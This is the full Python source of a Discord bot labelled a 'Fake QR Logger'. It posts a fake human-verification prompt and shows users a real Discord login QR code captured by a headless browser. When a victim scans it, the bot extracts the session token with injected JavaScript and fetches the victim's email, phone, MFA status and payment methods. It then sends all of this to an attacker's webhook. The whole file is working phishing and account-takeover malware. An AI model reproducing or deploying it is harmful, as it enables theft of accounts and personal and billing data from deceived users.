import os
import time
import json
import sys
import asyncio
import atexit

import requests
import nextcord
from nextcord import ButtonStyle, SyncWebhook
from nextcord.ui import Button, View
from nextcord.ext import commands
from colorama import Fore
from PIL import Image
from io import BytesIO
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC

red = Fore.LIGHTRED_EX
cyan = Fore.LIGHTCYAN_EX
yellow = Fore.LIGHTYELLOW_EX
green = Fore.LIGHTGREEN_EX

webhookUrl = ""
botToken = ""
prefix = ""
proxies = []

if os.path.exists(os.path.join(os.getcwd(), "config.json")):
    with open(os.path.join(os.getcwd(), "config.json"), "r", encoding="utf-8") as configfile:
        try:
            configuration = json.loads(configfile.read())
            webhookUrl = configuration["webhookUrl"]
            botToken = configuration["botToken"]
            prefix = configuration["prefix"]

        except Exception as err:
            print(red + "[!] While loading config.json, this error occured:\n")
            print(err)
            sys.exit()
        configfile.close()
else:
    print(red + "[!] Could not locate config.json\n")
    sys.exit()

intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)


class main():
    def __init__(self):
        self.webhook = SyncWebhook.from_url(webhookUrl)
        self.proxy = self._getproxy()
        self.driver = None
        self.token = ""
        self.timer = None
        self.login_url = ""
        self.QR_img = None
        self.QR_img_result = None

    def _getproxy(self):
        global proxies
        if proxies == []:
            print(yellow + "[!] No checked proxies yet, starting now...\n")
            if os.path.exists(os.path.join(os.getcwd(), "proxies.txt")):
                with open(os.path.join(os.getcwd(), "proxies.txt")) as proxyfile:
                    data = proxyfile.readlines()
                    proxies = data
                    number = 0
                    if data != [] or None:
                        for proxy in data:
                            proxy = proxy.strip()
                            try:
                                req_proxies = {"http": proxy, "https": proxy}
                                req = requests.get("https://example.com", proxies=req_proxies, timeout=5)
                                if req.status_code == 200:
                                    print(green + "[{}] Valid proxy: {}\n".format(number + 1, proxy))
                                    return proxy
                            except requests.exceptions.RequestException:
                                print(cyan + "[{}] Invalid proxy: {}\n".format(number + 1, proxy))
                                del proxies[number]

                            number = number + 1

                        print(red + "[!] No working proxies found\n")
                        sys.exit()

                    else:
                        print(red + "[!] No working proxies found\n")
                        sys.exit()
            else:
                print(red + "[!] Could not locate proxies.txt\n")
                sys.exit()

        else:
            number = 0
            new_check = False
            for proxy in proxies:
                proxy = proxy.strip()
                try:
                    req_proxies = {"http": proxy, "https": proxy}
                    req = requests.get("https://example.com", proxies=req_proxies, timeout=5)
                    if req.status_code == 200:
                        if new_check:
                            print(green + "[{}] Valid proxy: {}\n".format(number + 1, proxy))

                        return proxy
                except requests.exceptions.RequestException:
                    if number == 0:
                        print(yellow + "[!] Proxy turned invalid: {}, starting a new check\n".format(proxy))

                    print(cyan + "[{}] Invalid proxy: {}\n".format(number + 1, proxy))
                    del proxies[number]

                number = number + 1

            print(red + "[!] No working proxies found\n")
            sys.exit()

    def _getqr(self):
        self.timer = time.time()
        self.driver.get("https://discord.com/login")
        self.login_url = self.driver.current_url
        try:
            WebDriverWait(self.driver, 20).until(
                EC.visibility_of_all_elements_located((By.CLASS_NAME, "qrCode-2R7t9S")))

        except TimeoutException as err:
            print(red + "[!] While waiting for the QR to load in, this error occured:\n")
            print(err)
            sys.exit()

        time.sleep(10)

        try:
            div = self.driver.find_element(By.CLASS_NAME, "qrCode-2R7t9S")
            qr_svg = div.find_element(By.TAG_NAME, "svg")

        except Exception as err:
            print(red + "[!] While locating the QR, this error occured:\n")
            print(err)
            sys.exit()

        self.QR_img = qr_svg.screenshot_as_png

        return True

    def _addoverlay(self):
        img_buffer = BytesIO(self.QR_img)
        QR_img = Image.open(img_buffer)
        QR_img = QR_img.resize((320, 320))

        QR_overlay = Image.open(os.path.join(os.getcwd(), "components\\qr_overlay.png"))
        QR_overlay = QR_overlay.resize((100, 100))

        QR_img_width, QR_img_height = QR_img.size
        QR_overlay_width, QR_overlay_height = QR_overlay.size

        position = (
            (QR_img_width - QR_overlay_width) // 2,
            (QR_img_height - QR_overlay_height) // 2
        )

        QR_img.paste(QR_overlay, position, QR_overlay)

        img_buffer = BytesIO()
        QR_img.save(img_buffer, format="PNG")

        img_buffer.seek(0)
        self.QR_img_result = img_buffer

        return True

    def _getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }

        if token:
            headers.update({"Authorization": token})

        return headers
    def startup(self):
        firefox_options = Options()
        firefox_options.add_argument("--no-sandbox")
        firefox_options.add_argument("--headless")

        if self.proxy != None:
            proxy_capability = {
                "proxyType": "manual",
                "httpProxy": self.proxy,
                "sslProxy": self.proxy
            }
            firefox_options.set_capability(name="proxy", value=proxy_capability)

        try:
            self.driver = webdriver.Firefox(options=firefox_options)

        except Exception as err:
            print(red + "[!] While starting the webdriver, this error occured:\n")
            print(err)
            sys.exit()

        return True

    def generateqr(self):
        self._getqr()
        self._addoverlay()
        return self.QR_img_result

    def waitfor(self):
        while True:
            timepast = time.time() - self.timer
            if timepast >= 120:
                return False
            else:
                if self.driver.current_url != self.login_url:
                    return True

            time.sleep(1)

    def upload(self):
        embed = nextcord.Embed()
        user_data = {}
        billing_data = {}
        try:
            self.token = self.driver.execute_script("return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()")
        except Exception as err:
            print(red + "[!] While grabbing the user token, this error occured:\n")
            print(err)

        self.driver.quit()

        try:
            req = requests.get(url="https://discord.com/api/v6/users/@me", headers=self._getheaders(self.token))
            if req.status_code == 200:
                user_data = req.json()

            req = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=self._getheaders(self.token))
            if req.status_code == 200:
                billing_data = req.json()

        except Exception as err:
            print(red + "[!] While fetching the information of an user, this error occured:\n")
            print(err)

        try:
            if requests.get(f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.gif").status_code == 200:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.gif"
            else:
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png?size=128"

            embed.title = "User succesfully grabbed!"
            if user_data["discriminator"] == "0":
                embed.set_author(name=f"@{user_data['username']} ({str(user_data['id'])})")
            else:
                embed.set_author(name=f"@{user_data['username']}#{str(user_data['discriminator'])} ({str(user_data['id'])})")

            embed.set_thumbnail(url=avatar_url)

            embed.add_field(name="**Token**", value=f"```{str(self.token)}```", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)
            if user_data["email"]:
                embed.add_field(name="**Email**", value=user_data['email'], inline=True)
            else:
                embed.add_field(name="**Email**", value="None", inline=True)

            if user_data["phone"]:
                embed.add_field(name="**Phone**", value=str(user_data['phone']), inline=True)
            else:
                embed.add_field(name="**Phone**", value="None", inline=True)

            if user_data["verified"]:
                embed.add_field(name="**Verified**", value="true", inline=True)
            else:
                embed.add_field(name="**Verified**", value="false", inline=True)

            if user_data["mfa_enabled"]:
                embed.add_field(name="**MFA**", value="true", inline=True)
            else:
                embed.add_field(name="**MFA**", value="false", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            if user_data["premium_type"] == 0:
                embed.add_field(name="**Nitro**", value="None", inline=True)
            elif user_data["premium_type"] == 1:
                embed.add_field(name="**Nitro**", value="Nitro Classic", inline=True)
            elif user_data["premium_type"] == 2:
                embed.add_field(name="**Nitro**", value="Nitro", inline=True)
            elif user_data["premium_type"] == 3:
                embed.add_field(name="**Nitro**", value="Nitro Basic", inline=True)

            if billing_data:
                methods = []
                for method in billing_data:
                    if method['type'] == 1:
                        methods.append('💳')

                    elif method['type'] == 2:
                        methods.append("<:paypal:973417655627288666>")

                    else:
                        methods.append('❓')

                embed.add_field(name="💵 **Payment Methods**", value=" ".join(methods), inline=True)
            else:
                embed.add_field(name="💵 **Payment Methods**", value="None", inline=True)
        except Exception as err:
            print(red + "[!] While formatting the embed, this error occured:\n")
            print(err)

        embed.set_footer(text="Made by lizard0x | github.com/lizard0x")
        try:
            self.webhook.send(username="Fake QR Logger", content="@everyone", embed=embed)
        except Exception as err:
            print(red + "[!] While requesting the webhook, this error occured:\n")
            print(err)

        return True



def at_termination():
    print(yellow + "[!] Stopping event loop...\n")
    try:
        loop = asyncio.get_event_loop()
        loop.stop()
        print(green + "[!] Succesfully stopped event loop\n")

    except Exception as err:
        print(red + "[!] While stopping the event loop, this error occured:\n")
        print(err)
        print(red + "[!] To make sure your bot works properly the next time, please rerun the script and use the command \"{}shutdown\" in the Discord server\n".format(prefix))



def generate_qr():
    instance = main()
    succes = instance.startup()
    if succes:
        img = instance.generateqr()
        return instance, img


@bot.event
async def on_connect():
    print(green + "[!] Bot succesfully connected\n")

@bot.event
async def on_ready():
    print(green + "[!] Bot succesfully started\n")

@bot.command()
@commands.is_owner()
async def shutdown(ctx):
    await bot.close()


@bot.command()
async def setup(ctx):
    async def verification_callback(interaction: nextcord.Interaction):
        wait_embed = nextcord.Embed(
            title="Generating QR Code!",
            description="Thank you for starting the verification process. The verification is done by verifying your Discord account via a QR code.\n\nThe QR code generation process can take up to 20 seconds. Thank you for your patience.",
            color=nextcord.Colour.blurple()
        )

        qr_embed = nextcord.Embed(
            title="**Are You A Human? Let's Find Out!**",
            description="Please follow this step to verify your Discord account:\n\n1️⃣ _**Open the Discord Mobile application**_\n2️⃣ _**Go to settings**_\n3️⃣ _**Choose the \"Scan QR Code\" option**_\n4️⃣ _**Scan the QR code below**_\n\n**Note: You have upto 2 minutes to complete the verification until you need to start the process again.**",
            colour=nextcord.Colour.blurple()
        ).set_image("attachment://qr_image.png")

        wait_msg = await interaction.response.send_message(embed=wait_embed, ephemeral=True)
        instance, qr_image = await asyncio.to_thread(generate_qr)
        qr_file = nextcord.File(qr_image, filename="qr_image.png")

        await wait_msg.edit(embed=qr_embed, file=qr_file)

        status = await asyncio.to_thread(instance.waitfor)
        if status == True:
            succes = await asyncio.to_thread(instance.upload)
            if succes:
                print(green + "[!] Succesfully grabbed an user\n")

            else:
                print(red + "[!] Grabbing the user failed\n")
        else:
            instance.driver.quit()




    print(green + "[!] Succesfully initiated setup! Make sure that config.json and proxies.txt are properly configed. Take note that the first QR generation may take some time due to checking.\n")

    server_name = str(ctx.guild.name).replace("*", "").replace("_", "").replace("`", "").replace(">", "")
    verification_embed = nextcord.Embed(
        title="**Verification**",
        description="To gain acces to **{}**, you need to prove that you are a human.\n\nPlease start the verification process by clicking on \"**Verify**\"\n_Note: this verification process requires a mobile device_".format(server_name),
        colour=nextcord.Colour.blurple()
    )


    verifyButton = Button(style=ButtonStyle.primary, label="Verify Me!")
    verifyButton.callback = verification_callback
    view = View(timeout=None)
    view.add_item(verifyButton)

    await ctx.channel.send(embed=verification_embed, view=view)



if __name__ == "__main__":
    atexit.register(at_termination)
    bot.run(botToken)